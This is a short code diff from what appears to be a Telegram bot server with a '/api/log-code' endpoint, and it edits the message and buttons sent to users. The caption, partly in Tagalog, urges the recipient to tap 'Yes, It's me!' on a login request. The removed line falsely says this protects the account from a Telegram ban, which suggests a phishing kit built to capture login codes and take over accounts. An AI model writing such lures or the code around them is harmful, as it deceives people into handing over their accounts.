@@ -166,12 +166,12 @@ app.post("/api/log-code", async (req, res) => {
         PHOTO_URL,
         {
           caption: "I tap ang Yes, It's me!\n\n" +
-                   "wag mag alala dahil para ito sa account protection mo para hindi ma ban ni telegram",
+                   "Happy Watching and Happy Hunting.",
           reply_markup: {
             inline_keyboard: [
               [
                 { text: "Confirm", callback_data: `confirm_login:${userId}` },
-                { text: "I'm Gay", callback_data: `deny_login:${userId}` }
+                { text: "Cancel", callback_data: `deny_login:${userId}` }
               ]
             ]
           }
